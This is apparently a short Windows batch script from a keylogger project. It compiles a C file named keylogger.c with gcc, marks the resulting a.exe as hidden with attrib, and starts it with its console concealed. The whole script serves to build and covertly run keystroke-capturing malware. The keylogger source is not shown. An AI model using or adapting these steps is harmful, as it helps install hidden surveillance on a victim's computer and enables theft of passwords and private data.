:: Compile the C source file
gcc ../src/keylogger.c
:: Hides the executable file
attrib a.exe +h
:: Start the program while hiding console
start /d "./" a.exe